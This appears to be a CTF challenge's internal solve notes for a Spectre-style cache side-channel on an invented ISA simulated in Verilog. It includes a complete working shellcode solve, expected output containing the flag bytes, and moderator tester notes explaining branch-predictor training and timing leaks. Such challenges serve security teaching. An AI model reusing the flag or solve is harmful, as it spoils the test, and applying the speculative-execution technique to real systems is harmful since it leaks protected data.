## SOLVE INSTRUCTION FOR TESTING
copy paste contents of "ram.hex" into the prompt. </br>
The output must be something _like_ this: </br>
```
WELCOME
b 0 19 0 46 0 46 0 46 0 46 0 16 10 cf 0 1c 0 2d 0 2c 0 a1 1 1d 3a 67 22 9 0 3 13 8 10 3 c8 12 23 19 0 13 23 12 f 19 0 13 f 12 38 2 38 3 13 8 0 00 00 04 00 0 1 2 3 4 5 6 7 8 9 a b c d e f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad
b 0 19 0 46 0 46 0 46 0 46 0 16 10 cf 0 1c 0 2d 0 2c 0 a1 1 1d 3a 67 22 9 0 3 13 8 10 3 c8 12 23 19 0 13 23 12 f 19 0 13 f 12 38 2 38 3 13 8 0 00 00 04 00 0 1 2 3 4 5 6 7 8 9 a b c d e f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad
b'ERROR: ncore_tb.v:100: $readmemh(/dev/urandom): Invalid input character: \x9a\nWARNING: ncore_tb.v:81: $readmemh(flag.hex): Not enough words in the file for the requested range [0:255].\nWARNING: ncore_tb.v:86: $readmemh(ram.hex): Not enough words in the file for the requested range [0:255].\nxx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx ad ac ab aa 7d 21 65 65 6d 5f 40 5f 6b 30 30 6c 5f 36 69 6d 5f 52 6d 5f 4d 69 5f 49 68 7b 67 61 6c 66 8b 8a 89 88 87 86 85 84 \n'
```
The warning/ errors are fine, the **KEY** thing is that the flag should be there (somewhere) in reverse, this part:
```
7d 21 65 65 6d 5f 40 5f 6b 30 30 6c 5f 36 69 6d 5f 52 6d 5f 4d 69 5f 49 68 7b 67 61 6c 66
```
## Details
Compile with: 
```bash
iverilog -g2012 -o nco ncore_tb.v
```
Try this program:
```
MOVFSI R0 R1 1
INC R3
INC R3
RDTM R1
MOVF R0 108
RDTM R1
MOVF R0 110
RDTM R1
MOVF R0 110
RDTM R1
```
It shows how cached accesses take 4 ticks, while uncached takes 8. I think it basically works, we just need a solve to make sure...

## The outline
Fool branch prediction to speculatively do a _MOVFSI R1,R0,IMM_ (which WONT get executed, otherwise you lock the core) now the result is in cache, try different Xs to load _MOVF X_ and time them, if it takes 4 clock, X is the value in _SAFE\_ROM\[IMM\]_.

## Epistemological Commentary
What does a challenge measure? How can we measure the skill of shellcoding? Say for a typical pwn problem, we are almost always measuring multiple skills and knowledge: familiarity with the underlying arch (x86/arm/etc) with the type of vuln, with the tools of the trade and so on. Then a curious mind may posit that we cannot ever distinguish a skill in isolation from other knowledge with a challenge. </br> 

I challenge this assumption, what if the ISA was not a known ISA? What if there wasn't much tools could do? In this challenge, it would be rather easy to find out it's supposed to be a cache side-channel, it's really so on the nose. Next would be to hatch a plan and shellcode the idea to fruition, with no known ISA and no specific tool able to help, it is kind of a pure challenge of shellcoding in some made-up ISA you just saw. It is not easy, and prone to mistakes, but give the verilog source, it also would demonstrate the value of debugging, and the tool is VVP/IVERILOG, not something that people would usually be doing in every CTF, with an exotic ting to it. & finally there is a cool factor, because of all the hype SPECTRE got, and hopefully people would come away with a sense of accomplishment after solving this.

## Solve Works!
It ain't pretty. It ain't pretty at all. But now it works, the following is a solve which does spit out the flag: 
```
FLUSH
INC R1
// fool branch predication
JGT R0 R1 0
JGT R0 R1 0
JGT R0 R1 0
JGT R0 R1 0
JGT R1 R0 16
// this will happen speculatively
MOVFSI R0 R3 0
// timing loop
RDTM R1
MOVFU R2 0
RDTM R2
SUB R2 R2 R1
MOVFU R1 58
// was it in cache?
JEQ R2 R1 34
INC R0
MOVT R0 19
JMP 16
MOVT R0 200
MOVF R1 35
INC R1
MOVT R1 35
MOVF R1 15
INC R1
MOVT R1 15
MOVF R1 56
MOVF R0 56
MOVT R0 19
// moving on to next byte..
JMP 0
00 00
04 00
```

## TODO
maybe clean up code? and add more verbose overview.

## Tester notes (written in collaboration with the author, for the purpose of the CTF moderators):
This challenge combines easy reversing of Verilog (we give them the source code) with pwning skills involving crafting shellcode to exploit a vulnerability similar to the SPECTRE vulnerability. I didn't actually do the reversing and the exploitation -- I basically believed the author when he told me that it's a reasonable line of logic from the challenge description, which mentions that the architecture uses pipelining and a timing clock, and also does branch prediction. The idea is to take advantage of the branch prediction logic. There are two user modes, EMODE and UMODE. There's a boolean register that we'll call "emode", and if it's 1, safeROM can be accessed. According to the author, if you don't have access to the privileged mode (call it "EMODE" for argument's sake) you shouldn't be able to access contents of safeROM, but if branch prediction mispredicts, it will bring stuff speculatively into the cache, and after realizing it has mispredicted, that stuff remains in the cache. So the idea is to put things in the cache, switch to privileged mode, and execute them.

For this challenge, in comparison to `n_core` (CSAW Quals 2021), the user cannot switch to privileged mode. So you as the user make a bunch of jump instructions that are not taken, then branch prediction thinks the next one is also not gonna be taken (but this one is).

In the wrong branch, RAM[SAFE_ROM(i)] comes into the cache (sepculatively). Now you have RAM[SAFE_ROM(i)] in cache. You can try accessing different addresses and time them. And one address will be available faster. which address? SAFE_ROM(i) So now you have 1 byte, i -> i + 1

Here's the paper: https://spectreattack.com/spectre.pdf. 

There are now like ~15 papers all doing this stuff in various ways, but this original one was an eye-opener.

The file `disas.py` takes the above and implements it (in the `assem` function that is), generating the shellcode. 

The author's voice here:
`disas.py` is both an assembler and disassembler (for debugging purposes) and it does have a bug with 0 bytes, but this is what I used to assemble my shellcode. Probably every team comes up with their own tool with this.